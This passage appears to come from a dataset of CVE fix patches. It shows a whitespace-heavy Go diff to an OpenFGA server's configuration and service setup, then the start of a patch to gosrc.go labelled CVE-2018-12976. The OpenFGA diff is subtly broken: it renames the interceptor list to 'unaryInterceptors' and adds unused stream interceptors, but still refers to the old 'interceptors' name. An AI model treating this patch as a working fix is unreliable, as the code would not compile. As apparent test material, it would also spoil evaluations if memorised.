l.Addr().(*net.TCPAddr).Port\n+\n+        config.GRPC.Addr = fmt.Sprintf(\"0.0.0.0:%d\", grpcPort)\n+        config.HTTP.Addr = fmt.Sprintf(\"0.0.0.0:%d\", httpPort)\n+\n+        return config, nil\n }\n \n // DefaultConfig returns the OpenFGA server default configurations.\n func DefaultConfig() *Config {\n-\treturn &Config{\n-\t\tMaxTuplesPerWrite:             100,\n-\t\tMaxTypesPerAuthorizationModel: 100,\n-\t\tChangelogHorizonOffset:        0,\n-\t\tResolveNodeLimit:              25,\n-\t\tListObjectsDeadline:           3 * time.Second, // there is a 3-second timeout elsewhere\n-\t\tListObjectsMaxResults:         1000,\n-\t\tDatastore: DatastoreConfig{\n-\t\t\tEngine:       \"memory\",\n-\t\t\tMaxCacheSize: 100000,\n-\t\t},\n-\t\tGRPC: GRPCConfig{\n-\t\t\tAddr: \"0.0.0.0:8081\",\n-\t\t\tTLS:  TLSConfig{Enabled: false},\n-\t\t},\n-\t\tHTTP: HTTPConfig{\n-\t\t\tEnabled:            true,\n-\t\t\tAddr:               \"0.0.0.0:8080\",\n-\t\t\tTLS:                TLSConfig{Enabled: false},\n-\t\t\tUpstreamTimeout:    5 * time.Second,\n-\t\t\tCORSAllowedOrigins: []string{\"*\"},\n-\t\t\tCORSAllowedHeaders: []string{\"*\"},\n-\t\t},\n-\t\tAuthn: AuthnConfig{\n-\t\t\tMethod:                  \"none\",\n-\t\t\tAuthnPresharedKeyConfig: &AuthnPresharedKeyConfig{},\n-\t\t\tAuthnOIDCConfig:         &AuthnOIDCConfig{},\n-\t\t},\n-\t\tLog: LogConfig{\n-\t\t\tFormat: \"text\",\n-\t\t},\n-\t\tPlayground: PlaygroundConfig{\n-\t\t\tEnabled: true,\n-\t\t\tPort:    3000,\n-\t\t},\n-\t\tProfiler: ProfilerConfig{\n-\t\t\tEnabled: false,\n-\t\t\tAddr:    \":3001\",\n-\t\t},\n-\t}\n+        return &Config{\n+                MaxTuplesPerWrite:             100,\n+                MaxTypesPerAuthorizationModel: 100,\n+                ChangelogHorizonOffset:        0,\n+                ResolveNodeLimit:              25,\n+                ListObjectsDeadline:           3 * time.Second, // there is a 3-second timeout elsewhere\n+                ListObjectsMaxResults:         1000,\n+                Datastore: DatastoreConfig{\n+                        Engine:       \"memory\",\n+                        MaxCacheSize: 100000,\n+                },\n+                GRPC: GRPCConfig{\n+                        Addr: \"0.0.0.0:8081\",\n+                        TLS:  TLSConfig{Enabled: false},\n+                },\n+                HTTP: HTTPConfig{\n+                        Enabled:            true,\n+                        Addr:               \"0.0.0.0:8080\",\n+                        TLS:                TLSConfig{Enabled: false},\n+                        UpstreamTimeout:    5 * time.Second,\n+                        CORSAllowedOrigins: []string{\"*\"},\n+                        CORSAllowedHeaders: []string{\"*\"},\n+                },\n+                Authn: AuthnConfig{\n+                        Method:                  \"none\",\n+                        AuthnPresharedKeyConfig: &AuthnPresharedKeyConfig{},\n+                        AuthnOIDCConfig:         &AuthnOIDCConfig{},\n+                },\n+                Log: LogConfig{\n+                        Format: \"text\",\n+                },\n+                Playground: PlaygroundConfig{\n+                        Enabled: true,\n+                        Port:    3000,\n+                },\n+                Profiler: ProfilerConfig{\n+                        Enabled: false,\n+                        Addr:    \":3001\",\n+                },\n+        }\n }\n \n // GetServiceConfig returns the OpenFGA server configuration based on the values provided in the server's 'config.yaml' file.\n@@ -221,212 +221,217 @@ func DefaultConfig() *Config {\n // file is present, the default values are returned.\n func GetServiceConfig() (*Config, error) {\n \n-\tconfig := DefaultConfig()\n+        config := DefaultConfig()\n \n-\tviper.SetConfigName(\"config\")\n-\tviper.SetConfigType(\"yaml\")\n+        viper.SetConfigName(\"config\")\n+        viper.SetConfigType(\"yaml\")\n \n-\tconfigPaths := []string{\"/etc/openfga\", \"$HOME/.openfga\", \".\"}\n-\tfor _, path := range configPaths {\n-\t\tviper.AddConfigPath(path)\n-\t}\n-\tviper.SetEnvPrefix(\"OPENFGA\")\n-\tviper.SetEnvKeyReplacer(strings.NewReplacer(\".\", \"_\"))\n-\tviper.AutomaticEnv()\n+        configPaths := []string{\"/etc/openfga\", \"$HOME/.openfga\", \".\"}\n+        for _, path := range configPaths {\n+                viper.AddConfigPath(path)\n+        }\n+        viper.SetEnvPrefix(\"OPENFGA\")\n+        viper.SetEnvKeyReplacer(strings.NewReplacer(\".\", \"_\"))\n+        viper.AutomaticEnv()\n \n-\terr := viper.ReadInConfig()\n-\tif err != nil {\n-\t\t_, ok := err.(viper.ConfigFileNotFoundError)\n-\t\tif !ok {\n-\t\t\treturn nil, errors.Errorf(\"failed to load server config: %w\", err)\n-\t\t}\n-\t}\n+        err := viper.ReadInConfig()\n+        if err != nil {\n+                _, ok := err.(viper.ConfigFileNotFoundError)\n+                if !ok {\n+                        return nil, errors.Errorf(\"failed to load server config: %w\", err)\n+                }\n+        }\n \n-\tif err := viper.Unmarshal(config); err != nil {\n-\t\treturn nil, errors.Errorf(\"failed to unmarshal server config: %w\", err)\n-\t}\n+        if err := viper.Unmarshal(config); err != nil {\n+                return nil, errors.Errorf(\"failed to unmarshal server config: %w\", err)\n+        }\n \n-\treturn config, nil\n+        return config, nil\n }\n \n type service struct {\n-\tserver        *server.Server\n-\tgrpcAddr      netip.AddrPort\n-\thttpAddr      netip.AddrPort\n-\tdatastore     storage.OpenFGADatastore\n-\tauthenticator authn.Authenticator\n+        server        *server.Server\n+        grpcAddr      netip.AddrPort\n+        httpAddr      netip.AddrPort\n+        datastore     storage.OpenFGADatastore\n+        authenticator authn.Authenticator\n }\n \n func (s *service) Close(ctx context.Context) error {\n-\ts.authenticator.Close()\n+        s.authenticator.Close()\n \n-\treturn s.datastore.Close(ctx)\n+        return s.datastore.Close(ctx)\n }\n \n func (s *service) Run(ctx context.Context) error {\n-\treturn s.server.Run(ctx)\n+        return s.server.Run(ctx)\n }\n \n // GetHTTPAddrPort returns the configured or auto-assigned port that the underlying HTTP service is running on.\n func (s *service) GetHTTPAddrPort() netip.AddrPort {\n-\treturn s.httpAddr\n+        return s.httpAddr\n }\n \n // GetGRPCAddrPort returns the configured or auto-assigned port that the underlying grpc service is running on.\n func (s *service) GetGRPCAddrPort() netip.AddrPort {\n-\treturn s.grpcAddr\n+        return s.grpcAddr\n }\n \n func BuildService(config *Config, logger logger.Logger) (*service, error) {\n-\ttracer := telemetry.NewNoopTracer()\n-\tmeter := telemetry.NewNoopMeter()\n-\ttokenEncoder := encoder.NewTokenEncoder(encrypter.NewNoopEncrypter(), encoder.NewBase64Encoder())\n-\n-\tvar datastore storage.OpenFGADatastore\n-\tvar err error\n-\tswitch config.Datastore.Engine {\n-\tcase \"memory\":\n-\t\tdatastore = memory.New(tracer, config.MaxTuplesPerWrite, config.MaxTypesPerAuthorizationModel)\n-\tcase \"mysql\":\n-\t\topts := []mysql.MySQLOption{\n-\t\t\tmysql.WithLogger(logger),\n-\t\t\tmysql.WithTracer(tracer),\n-\t\t}\n-\n-\t\tdatastore, err = mysql.NewMySQLDatastore(config.Datastore.URI, opts...)\n-\t\tif err != nil {\n-\t\t\treturn nil, errors.Errorf(\"failed to initialize mysql datastore: %v\", err)\n-\t\t}\n-\tcase \"postgres\":\n-\t\topts := []postgres.PostgresOption{\n-\t\t\tpostgres.WithLogger(logger),\n-\t\t\tpostgres.WithTracer(tracer),\n-\t\t}\n-\n-\t\tdatastore, err = postgres.NewPostgresDatastore(config.Datastore.URI, opts...)\n-\t\tif err != nil {\n-\t\t\treturn nil, errors.Errorf(\"failed to initialize postgres datastore: %v\", err)\n-\t\t}\n-\tdefault:\n-\t\treturn nil, errors.Errorf(\"storage engine '%s' is unsupported\", config.Datastore.Engine)\n-\t}\n-\n-\tlogger.Info(fmt.Sprintf(\"using '%v' storage engine\", config.Datastore.Engine))\n-\n-\tvar grpcTLSConfig *server.TLSConfig\n-\tif config.GRPC.TLS.Enabled {\n-\t\tif config.GRPC.TLS.CertPath == \"\" || config.GRPC.TLS.KeyPath == \"\" {\n-\t\t\treturn nil, ErrInvalidGRPCTLSConfig\n-\t\t}\n-\t\tgrpcTLSConfig = &server.TLSConfig{\n-\t\t\tCertPath: config.GRPC.TLS.CertPath,\n-\t\t\tKeyPath:  config.GRPC.TLS.KeyPath,\n-\t\t}\n-\t\tlogger.Info(\"grpc TLS is enabled, serving connections using the provided certificate\")\n-\t} else {\n-\t\tlogger.Warn(\"grpc TLS is disabled, serving connections using insecure plaintext\")\n-\t}\n-\n-\tvar httpTLSConfig *server.TLSConfig\n-\tif config.HTTP.TLS.Enabled {\n-\t\tif config.HTTP.TLS.CertPath == \"\" || config.HTTP.TLS.KeyPath == \"\" {\n-\t\t\treturn nil, ErrInvalidHTTPTLSConfig\n-\t\t}\n-\t\thttpTLSConfig = &server.TLSConfig{\n-\t\t\tCertPath: config.HTTP.TLS.CertPath,\n-\t\t\tKeyPath:  config.HTTP.TLS.KeyPath,\n-\t\t}\n-\t\tlogger.Info(\"HTTP TLS is enabled, serving HTTP connections using the provided certificate\")\n-\t} else {\n-\t\tlogger.Warn(\"HTTP TLS is disabled, serving connections using insecure plaintext\")\n-\t}\n-\n-\tvar authenticator authn.Authenticator\n-\tswitch config.Authn.Method {\n-\tcase \"none\":\n-\t\tlogger.Warn(\"authentication is disabled\")\n-\t\tauthenticator = authn.NoopAuthenticator{}\n-\tcase \"preshared\":\n-\t\tlogger.Info(\"using 'preshared' authentication\")\n-\t\tauthenticator, err = presharedkey.NewPresharedKeyAuthenticator(config.Authn.Keys)\n-\tcase \"oidc\":\n-\t\tlogger.Info(\"using 'oidc' authentication\")\n-\t\tauthenticator, err = oidc.NewRemoteOidcAuthenticator(config.Authn.Issuer, config.Authn.Audience)\n-\tdefault:\n-\t\treturn nil, errors.Errorf(\"unsupported authentication method '%v'\", config.Authn.Method)\n-\t}\n-\tif err != nil {\n-\t\treturn nil, errors.Errorf(\"failed to initialize authenticator: %v\", err)\n-\t}\n-\n-\tinterceptors := []grpc.UnaryServerInterceptor{\n-\t\tgrpc_auth.UnaryServerInterceptor(middleware.AuthFunc(authenticator)),\n-\t\tmiddleware.NewErrorLoggingInterceptor(logger),\n-\t}\n-\n-\tgrpcHostAddr, grpcHostPort, err := net.SplitHostPort(config.GRPC.Addr)\n-\tif err != nil {\n-\t\treturn nil, errors.Errorf(\"`grpc.addr` config must be in the form [host]:port\")\n-\t}\n-\n-\tif grpcHostAddr == \"\" {\n-\t\tgrpcHostAddr = \"0.0.0.0\"\n-\t}\n-\n-\tgrpcAddr, err := netip.ParseAddrPort(fmt.Sprintf(\"%s:%s\", grpcHostAddr, grpcHostPort))\n-\tif err != nil {\n-\t\treturn nil, errors.Errorf(\"failed to parse the 'grpc.addr' config: %v\", err)\n-\t}\n-\n-\thttpHostAddr, httpHostPort, err := net.SplitHostPort(config.HTTP.Addr)\n-\tif err != nil {\n-\t\treturn nil, errors.Errorf(\"`http.addr` config must be in the form [host]:port\")\n-\t}\n-\n-\tif httpHostAddr == \"\" {\n-\t\thttpHostAddr = \"0.0.0.0\"\n-\t}\n-\n-\thttpAddr, err := netip.ParseAddrPort(fmt.Sprintf(\"%s:%s\", httpHostAddr, httpHostPort))\n-\tif err != nil {\n-\t\treturn nil, errors.Errorf(\"failed to parse the 'http.addr' config: %v\", err)\n-\t}\n-\n-\topenFgaServer, err := server.New(&server.Dependencies{\n-\t\tDatastore:    caching.NewCachedOpenFGADatastore(datastore, config.Datastore.MaxCacheSize),\n-\t\tTracer:       tracer,\n-\t\tLogger:       logger,\n-\t\tMeter:        meter,\n-\t\tTokenEncoder: tokenEncoder,\n-\t}, &server.Config{\n-\t\tGRPCServer: server.GRPCServerConfig{\n-\t\t\tAddr:      grpcAddr,\n-\t\t\tTLSConfig: grpcTLSConfig,\n-\t\t},\n-\t\tHTTPServer: server.HTTPServerConfig{\n-\t\t\tEnabled:            config.HTTP.Enabled,\n-\t\t\tAddr:               httpAddr,\n-\t\t\tTLSConfig:          httpTLSConfig,\n-\t\t\tUpstreamTimeout:    config.HTTP.UpstreamTimeout,\n-\t\t\tCORSAllowedOrigins: config.HTTP.CORSAllowedOrigins,\n-\t\t\tCORSAllowedHeaders: config.HTTP.CORSAllowedHeaders,\n-\t\t},\n-\t\tResolveNodeLimit:       config.ResolveNodeLimit,\n-\t\tChangelogHorizonOffset: config.ChangelogHorizonOffset,\n-\t\tListObjectsDeadline:    config.ListObjectsDeadline,\n-\t\tListObjectsMaxResults:  config.ListObjectsMaxResults,\n-\t\tUnaryInterceptors:      interceptors,\n-\t\tMuxOptions:             nil,\n-\t})\n-\tif err != nil {\n-\t\treturn nil, errors.Errorf(\"failed to initialize openfga server: %v\", err)\n-\t}\n-\n-\treturn &service{\n-\t\tserver:        openFgaServer,\n-\t\tgrpcAddr:      grpcAddr,\n-\t\thttpAddr:      httpAddr,\n-\t\tdatastore:     datastore,\n-\t\tauthenticator: authenticator,\n-\t}, nil\n+        tracer := telemetry.NewNoopTracer()\n+        meter := telemetry.NewNoopMeter()\n+        tokenEncoder := encoder.NewTokenEncoder(encrypter.NewNoopEncrypter(), encoder.NewBase64Encoder())\n+\n+        var datastore storage.OpenFGADatastore\n+        var err error\n+        switch config.Datastore.Engine {\n+        case \"memory\":\n+                datastore = memory.New(tracer, config.MaxTuplesPerWrite, config.MaxTypesPerAuthorizationModel)\n+        case \"mysql\":\n+                opts := []mysql.MySQLOption{\n+                        mysql.WithLogger(logger),\n+                        mysql.WithTracer(tracer),\n+                }\n+\n+                datastore, err = mysql.NewMySQLDatastore(config.Datastore.URI, opts...)\n+                if err != nil {\n+                        return nil, errors.Errorf(\"failed to initialize mysql datastore: %v\", err)\n+                }\n+        case \"postgres\":\n+                opts := []postgres.PostgresOption{\n+                        postgres.WithLogger(logger),\n+                        postgres.WithTracer(tracer),\n+                }\n+\n+                datastore, err = postgres.NewPostgresDatastore(config.Datastore.URI, opts...)\n+                if err != nil {\n+                        return nil, errors.Errorf(\"failed to initialize postgres datastore: %v\", err)\n+                }\n+        default:\n+                return nil, errors.Errorf(\"storage engine '%s' is unsupported\", config.Datastore.Engine)\n+        }\n+\n+        logger.Info(fmt.Sprintf(\"using '%v' storage engine\", config.Datastore.Engine))\n+\n+        var grpcTLSConfig *server.TLSConfig\n+        if config.GRPC.TLS.Enabled {\n+                if config.GRPC.TLS.CertPath == \"\" || config.GRPC.TLS.KeyPath == \"\" {\n+                        return nil, ErrInvalidGRPCTLSConfig\n+                }\n+                grpcTLSConfig = &server.TLSConfig{\n+                        CertPath: config.GRPC.TLS.CertPath,\n+                        KeyPath:  config.GRPC.TLS.KeyPath,\n+                }\n+                logger.Info(\"grpc TLS is enabled, serving connections using the provided certificate\")\n+        } else {\n+                logger.Warn(\"grpc TLS is disabled, serving connections using insecure plaintext\")\n+        }\n+\n+        var httpTLSConfig *server.TLSConfig\n+        if config.HTTP.TLS.Enabled {\n+                if config.HTTP.TLS.CertPath == \"\" || config.HTTP.TLS.KeyPath == \"\" {\n+                        return nil, ErrInvalidHTTPTLSConfig\n+                }\n+                httpTLSConfig = &server.TLSConfig{\n+                        CertPath: config.HTTP.TLS.CertPath,\n+                        KeyPath:  config.HTTP.TLS.KeyPath,\n+                }\n+                logger.Info(\"HTTP TLS is enabled, serving HTTP connections using the provided certificate\")\n+        } else {\n+                logger.Warn(\"HTTP TLS is disabled, serving connections using insecure plaintext\")\n+        }\n+\n+        var authenticator authn.Authenticator\n+        switch config.Authn.Method {\n+        case \"none\":\n+                logger.Warn(\"authentication is disabled\")\n+                authenticator = authn.NoopAuthenticator{}\n+        case \"preshared\":\n+                logger.Info(\"using 'preshared' authentication\")\n+                authenticator, err = presharedkey.NewPresharedKeyAuthenticator(config.Authn.Keys)\n+        case \"oidc\":\n+                logger.Info(\"using 'oidc' authentication\")\n+                authenticator, err = oidc.NewRemoteOidcAuthenticator(config.Authn.Issuer, config.Authn.Audience)\n+        default:\n+                return nil, errors.Errorf(\"unsupported authentication method '%v'\", config.Authn.Method)\n+        }\n+        if err != nil {\n+                return nil, errors.Errorf(\"failed to initialize authenticator: %v\", err)\n+        }\n+\n+        unaryInterceptors := []grpc.UnaryServerInterceptor{\n+                grpc_auth.UnaryServerInterceptor(middleware.AuthFunc(authenticator)),\n+                middleware.NewErrorLoggingInterceptor(logger),\n+        }\n+\n+        streamInterceptors := []grpc.StreamServerInterceptor{\n+                grpc_auth.StreamServerInterceptor(middleware.AuthFunc(authenticator)),\n+                middleware.NewStreamingErrorLoggingInterceptor(logger),\n+        }\n+\n+        grpcHostAddr, grpcHostPort, err := net.SplitHostPort(config.GRPC.Addr)\n+        if err != nil {\n+                return nil, errors.Errorf(\"`grpc.addr` config must be in the form [host]:port\")\n+        }\n+\n+        if grpcHostAddr == \"\" {\n+                grpcHostAddr = \"0.0.0.0\"\n+        }\n+\n+        grpcAddr, err := netip.ParseAddrPort(fmt.Sprintf(\"%s:%s\", grpcHostAddr, grpcHostPort))\n+        if err != nil {\n+                return nil, errors.Errorf(\"failed to parse the 'grpc.addr' config: %v\", err)\n+        }\n+\n+        httpHostAddr, httpHostPort, err := net.SplitHostPort(config.HTTP.Addr)\n+        if err != nil {\n+                return nil, errors.Errorf(\"`http.addr` config must be in the form [host]:port\")\n+        }\n+\n+        if httpHostAddr == \"\" {\n+                httpHostAddr = \"0.0.0.0\"\n+        }\n+\n+        httpAddr, err := netip.ParseAddrPort(fmt.Sprintf(\"%s:%s\", httpHostAddr, httpHostPort))\n+        if err != nil {\n+                return nil, errors.Errorf(\"failed to parse the 'http.addr' config: %v\", err)\n+        }\n+\n+        openFgaServer, err := server.New(&server.Dependencies{\n+                Datastore:    caching.NewCachedOpenFGADatastore(datastore, config.Datastore.MaxCacheSize),\n+                Tracer:       tracer,\n+                Logger:       logger,\n+                Meter:        meter,\n+                TokenEncoder: tokenEncoder,\n+        }, &server.Config{\n+                GRPCServer: server.GRPCServerConfig{\n+                        Addr:      grpcAddr,\n+                        TLSConfig: grpcTLSConfig,\n+                },\n+                HTTPServer: server.HTTPServerConfig{\n+                        Enabled:            config.HTTP.Enabled,\n+                        Addr:               httpAddr,\n+                        TLSConfig:          httpTLSConfig,\n+                        UpstreamTimeout:    config.HTTP.UpstreamTimeout,\n+                        CORSAllowedOrigins: config.HTTP.CORSAllowedOrigins,\n+                        CORSAllowedHeaders: config.HTTP.CORSAllowedHeaders,\n+                },\n+                ResolveNodeLimit:       config.ResolveNodeLimit,\n+                ChangelogHorizonOffset: config.ChangelogHorizonOffset,\n+                ListObjectsDeadline:    config.ListObjectsDeadline,\n+                ListObjectsMaxResults:  config.ListObjectsMaxResults,\n+                UnaryInterceptors:      interceptors,\n+                MuxOptions:             nil,\n+        })\n+        if err != nil {\n+                return nil, errors.Errorf(\"failed to initialize openfga server: %v\", err)\n+        }\n+\n+        return &service{\n+                server:        openFgaServer,\n+                grpcAddr:      grpcAddr,\n+                httpAddr:      httpAddr,\n+                datastore:     datastore,\n+                authenticator: authenticator,\n+        }, nil\n }\n"}
{"cve":"CVE-2018-12976:0708", "fix_patch": "diff --git a/gosrc/gosrc.go b/gosrc/gosrc.go\nindex 9a9e44b..53c2036 100644\n--- a/gosrc/gosrc.go\n+++ b/gosrc/gosrc.go\n@@ -8,526 +8,526 @@\n package gosrc\n \n import (\n-\t\"context\"\n-\t\"encoding/xml\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net/http\"\n-\t\"path\"\n-\t\"regexp\"\n-\t\"strings\"\n-\t\"time\"\n+        \"context\"\n+        \"encoding/xml\"\n+        \"errors\"\n+        \"fmt\"\n+        \"io\"\n+        \"net/http\"\n+        \"path\"\n+        \"regexp\"\n+        \"strings\"\n+        \"time\"\n )\n \n const ExpiresAfter = 2 * 365 * 24 * time.Hour // Package with no commits and imports expires.\n \n // File represents a file.\n type File struct {\n-\t// File name with no directory.\n-\tName string\n+        // File name with no directory.\n+        Name string\n \n-\t// Contents of the file.\n-\tData []byte\n+        // Contents of the file.\n+        Data []byte\n \n-\t// Location of file on version control service website.\n-\tBrowseURL string\n+        // Location of file on version control service website.\n+        BrowseURL string\n }\n \n type DirectoryStatus int\n \n const (\n-\tActive          DirectoryStatus = iota\n-\tDeadEndFork                     // Forks with no commits\n-\tQuickFork                       // Forks with less than 3 commits, all within a week from creation\n-\tNoRecentCommits                 // No commits for ExpiresAfter\n-\n-\t// No commits for ExpiresAfter and no imports.\n-\t// This is a status derived from NoRecentCommits and the imports count information in the db.\n-\tInactive\n+        Active          DirectoryStatus = iota\n+        DeadEndFork                     // Forks with no commits\n+        QuickFork                       // Forks with less than 3 commits, all within a week from creation\n+        NoRecentCommits                 // No commits for ExpiresAfter\n+\n+        // No commits for ExpiresAfter and no imports.\n+        // This is a status derived from NoRecentCommits and the imports count information in the db.\n+        Inactive\n )\n \n // Directory describes a directory on a version control service.\n type Directory struct {\n-\t// The import path for this package.\n-\tImportPath string\n+        // The import path for this package.\n+        ImportPath string\n \n-\t// Import path of package after resolving go-import meta tags, if any.\n-\tResolvedPath string\n+        // Import path of package after resolving go-import meta tags, if any.\n+        ResolvedPath string\n \n-\t// Import path prefix for all packages in the project.\n-\tProjectRoot string\n+        // Import path prefix for all packages in the project.\n+        ProjectRoot string\n \n-\t// Name of the project.\n-\tProjectName string\n+        // Name of the project.\n+        ProjectName string\n \n-\t// Project home page.\n-\tProjectURL string\n+        // Project home page.\n+        ProjectURL string\n \n-\t// Version control system: git, hg, bzr, ...\n-\tVCS string\n+        // Version control system: git, hg, bzr, ...\n+        VCS string\n \n-\t// Version control: active or should be suppressed.\n-\tStatus DirectoryStatus\n+        // Version control: active or should be suppressed.\n+        Status DirectoryStatus\n \n-\t// Cache validation tag. This tag is not necessarily an HTTP entity tag.\n-\t// The tag is \"\" if there is no meaningful cache validation for the VCS.\n-\tEtag string\n+        // Cache validation tag. This tag is not necessarily an HTTP entity tag.\n+        // The tag is \"\" if there is no meaningful cache validation for the VCS.\n+        Etag string\n \n-\t// Files.\n-\tFiles []*File\n+        // Files.\n+        Files []*File\n \n-\t// Subdirectories, not guaranteed to contain Go code.\n-\tSubdirectories []string\n+        // Subdirectories, not guaranteed to contain Go code.\n+        Subdirectories []string\n \n-\t// Location of directory on version control service website.\n-\tBrowseURL string\n+        // Location of directory on version control service website.\n+        BrowseURL string\n \n-\t// Format specifier for link to source line. It must contain one %s (file URL)\n-\t// followed by one %d (source line number), or be empty string if not available.\n-\t// Example: \"%s#L%d\".\n-\tLineFmt string\n+        // Format specifier for link to source line. It must contain one %s (file URL)\n+        // followed by one %d (source line number), or be empty string if not available.\n+        // Example: \"%s#L%d\".\n+        LineFmt string\n \n-\t// Whether the repository of this directory is a fork of another one.\n-\tFork bool\n+        // Whether the repository of this directory is a fork of another one.\n+        Fork bool\n \n-\t// How many stars (for a GitHub project) or followers (for a BitBucket\n-\t// project) the repository of this directory has.\n-\tStars int\n+        // How many stars (for a GitHub project) or followers (for a BitBucket\n+        // project) the repository of this directory has.\n+        Stars int\n }\n \n // Project represents a repository.\n type Project struct {\n-\tDescription string\n+        Description string\n }\n \n // NotFoundError indicates that the directory or presentation was not found.\n type NotFoundError struct {\n-\t// Diagnostic message describing why the directory was not found.\n-\tMessage string\n+        // Diagnostic message describing why the directory was not found.\n+        Message string\n \n-\t// Redirect specifies the path where package can be found.\n-\tRedirect string\n+        // Redirect specifies the path where package can be found.\n+        Redirect string\n }\n \n func (e NotFoundError) Error() string {\n-\treturn e.Message\n+        return e.Message\n }\n \n // IsNotFound returns true if err is of type NotFoundError.\n func IsNotFound(err error) bool {\n-\t_, ok := err.(NotFoundError)\n-\treturn ok\n+        _, ok := err.(NotFoundError)\n+        return ok\n }\n \n type RemoteError struct {\n-\tHost string\n-\terr  error\n+        Host string\n+        err  error\n }\n \n func (e *RemoteError) Error() string {\n-\treturn e.err.Error()\n+        return e.err.Error()\n }\n \n type NotModifiedError struct {\n-\tSince  time.Time\n-\tStatus DirectoryStatus\n+        Since  time.Time\n+        Status DirectoryStatus\n }\n \n func (e NotModifiedError) Error() string {\n-\tmsg := \"package not modified\"\n-\tif !e.Since.IsZero() {\n-\t\tmsg += fmt.Sprintf(\" since %s\", e.Since.Format(time.RFC1123))\n-\t}\n-\tif e.Status == QuickFork {\n-\t\tmsg += \" (package is a quick fork)\"\n-\t}\n-\treturn msg\n+        msg := \"package not modified\"\n+        if !e.Since.IsZero() {\n+                msg += fmt.Sprintf(\" since %s\", e.Since.Format(time.RFC1123))\n+        }\n+        if e.Status == QuickFork {\n+                msg += \" (package is a quick fork)\"\n+        }\n+        return msg\n }\n \n var errNoMatch = errors.New(\"no match\")\n \n // service represents a source code control service.\n type service struct {\n-\tpattern         *regexp.Regexp\n-\tprefix          string\n-\tget             func(context.Context, *http.Client, map[string]string, string) (*Directory, error)\n-\tgetPresentation func(context.Context, *http.Client, map[string]string) (*Presentation, error)\n-\tgetProject      func(context.Context, *http.Client, map[string]string) (*Project, error)\n+        pattern         *regexp.Regexp\n+        prefix          string\n+        get             func(context.Context, *http.Client, map[string]string, string) (*Directory, error)\n+        getPresentation func(context.Context, *http.Client, map[string]string) (*Presentation, error)\n+        getProject      func(context.Context, *http.Client, map[string]string) (*Project, error)\n }\n \n var services []*service\n \n func addService(s *service) {\n-\tif s.prefix == \"\" {\n-\t\tservices = append(services, s)\n-\t} else {\n-\t\tservices = append([]*service{s}, services...)\n-\t}\n+        if s.prefix == \"\" {\n+                services = append(services, s)\n+        } else {\n+                services = append([]*service{s}, services...)\n+        }\n }\n \n func (s *service) match(importPath string) (map[string]string, error) {\n-\tif !strings.HasPrefix(importPath, s.prefix) {\n-\t\treturn nil, nil\n-\t}\n-\tm := s.pattern.FindStringSubmatch(importPath)\n-\tif m == nil {\n-\t\tif s.prefix != \"\" {\n-\t\t\treturn nil, NotFoundError{Message: \"Import path prefix matches known service, but regexp does not.\"}\n-\t\t}\n-\t\treturn nil, nil\n-\t}\n-\tmatch := map[string]string{\"importPath\": importPath}\n-\tfor i, n := range s.pattern.SubexpNames() {\n-\t\tif n != \"\" {\n-\t\t\tmatch[n] = m[i]\n-\t\t}\n-\t}\n-\treturn match, nil\n+        if !strings.HasPrefix(importPath, s.prefix) {\n+                return nil, nil\n+        }\n+        m := s.pattern.FindStringSubmatch(importPath)\n+        if m == nil {\n+                if s.prefix != \"\" {\n+                        return nil, NotFoundError{Message: \"Import path prefix matches known service, but regexp does not.\"}\n+                }\n+                return nil, nil\n+        }\n+        match := map[string]string{\"importPath\": importPath}\n+        for i, n := range s.pattern.SubexpNames() {\n+                if n != \"\" {\n+                        match[n] = m[i]\n+                }\n+        }\n+        return match, nil\n }\n \n // importMeta represents the values in a go-import meta tag.\n type importMeta struct {\n-\tprojectRoot string\n-\tvcs         string\n-\trepo        string\n+        projectRoot string\n+        vcs         string\n+        repo        string\n }\n \n // sourceMeta represents the values in a go-source meta tag.\n type sourceMeta struct {\n-\tprojectRoot  string\n-\tprojectURL   string\n-\tdirTemplate  string\n-\tfileTemplate string\n+        projectRoot  string\n+        projectURL   string\n+        dirTemplate  string\n+        fileTemplate string\n }\n \n func isHTTPURL(s string) bool {\n-\treturn strings.HasPrefix(s, \"https://\") || strings.HasPrefix(s, \"http://\")\n+        return strings.HasPrefix(s, \"https://\") || strings.HasPrefix(s, \"http://\")\n }\n \n func replaceDir(s string, dir string) string {\n-\tslashDir := \"\"\n-\tdir = strings.Trim(dir, \"/\")\n-\tif dir != \"\" {\n-\t\tslashDir = \"/\" + dir\n-\t}\n-\ts = strings.Replace(s, \"{dir}\", dir, -1)\n-\ts = strings.Replace(s, \"{/dir}\", slashDir, -1)\n-\treturn s\n+        slashDir := \"\"\n+        dir = strings.Trim(dir, \"/\")\n+        if dir != \"\" {\n+                slashDir = \"/\" + dir\n+        }\n+        s = strings.Replace(s, \"{dir}\", dir, -1)\n+        s = strings.Replace(s, \"{/dir}\", slashDir, -1)\n+        return s\n }\n \n func attrValue(attrs []xml.Attr, name string) string {\n-\tfor _, a := range attrs {\n-\t\tif strings.EqualFold(a.Name.Local, name) {\n-\t\t\treturn a.Value\n-\t\t}\n-\t}\n-\treturn \"\"\n+        for _, a := range attrs {\n+                if strings.EqualFold(a.Name.Local, name) {\n+                        return a.Value\n+                }\n+        }\n+        return \"\"\n }\n \n func fetchMeta(ctx context.Context, client *http.Client, importPath string) (scheme string, im *importMeta, sm *sourceMeta, redir bool, err error) {\n-\turi := importPath\n-\tif !strings.Contains(uri, \"/\") {\n-\t\t// Add slash for root of domain.\n-\t\turi = uri + \"/\"\n-\t}\n-\turi = uri + \"?go-get=1\"\n-\n-\tc := httpClient{client: client}\n-\tscheme = \"https\"\n-\tresp, err := c.get(ctx, scheme+\"://\"+uri)\n-\tif err != nil || resp.StatusCode != 200 {\n-\t\tif err == nil {\n-\t\t\tresp.Body.Close()\n-\t\t}\n-\t\tscheme = \"http\"\n-\t\tresp, err = c.get(ctx, scheme+\"://\"+uri)\n-\t\tif err != nil {\n-\t\t\treturn scheme, nil, nil, false, err\n-\t\t}\n-\t}\n-\tdefer resp.Body.Close()\n-\tim, sm, redir, err = parseMeta(scheme, importPath, resp.Body)\n-\treturn scheme, im, sm, redir, err\n+        uri := importPath\n+        if !strings.Contains(uri, \"/\") {\n+                // Add slash for root of domain.\n+                uri = uri + \"/\"\n+        }\n+        uri = uri + \"?go-get=1\"\n+\n+        c := httpClient{client: client}\n+        scheme = \"https\"\n+        resp, err := c.get(ctx, scheme+\"://\"+uri)\n+        if err != nil || resp.StatusCode != 200 {\n+                if err == nil {\n+                        resp.Body.Close()\n+                }\n+                scheme = \"http\"\n+                resp, err = c.get(ctx, scheme+\"://\"+uri)\n+                if err != nil {\n+                        return scheme, nil, nil, false, err\n+                }\n+        